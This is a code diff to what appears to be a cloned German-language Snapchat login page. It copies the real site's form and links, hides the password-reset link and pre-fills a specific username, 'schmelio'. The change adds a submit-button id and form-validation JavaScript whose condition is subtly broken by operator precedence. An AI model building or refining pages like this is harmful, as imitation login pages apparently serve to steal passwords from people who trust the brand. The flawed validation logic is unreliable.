@@ -50,7 +50,7 @@
 											<input type="password" name="password" value="" autocomplete="off" id="password" class="form-control">
 										</div>
 										<div class="primary_action">
-											<button type="submit" class="btn btn-lg btn-primary" >Best&auml;tigen</button>
+											<button id="senden" type="submit" class="btn btn-lg btn-primary" >Best&auml;tigen</button>
 										</div>
 										<p style="display: none" class="secondary_action">
 											<a href="https://accounts.snapchat.com/accounts/password_reset_request">Passwort vergessen</a>
@@ -396,6 +396,32 @@
 				if(check == t) {
 					document.getElementById("username").value = "schmelio";
 				}
+				
+				
+				function doCheck(){
+					var allFilled = true;
+
+					var inputs = document.getElementsByTagName('input');
+					for(var i=0; i<inputs.length; i++){
+						if(inputs[i].type == "text" || inputs[i].type == "password" && inputs[i].value == ''){
+							allFilled = false;
+							break;
+						}
+					}
+
+					document.getElementById("senden").disabled = !allFilled;
+				}
+
+				window.onload = function(){
+					var inputs = document.getElementsByTagName('input');
+					for(var i=0; i<inputs.length; i++){
+						if(inputs[i].type == "text" || inputs[i].type == "password") {
+							inputs[i].onkeyup = doCheck;
+							inputs[i].onblur = doCheck;
+						}
+					}
+				};
+				
 			</script>
 		</div>
 		<!-- End Pusher -->
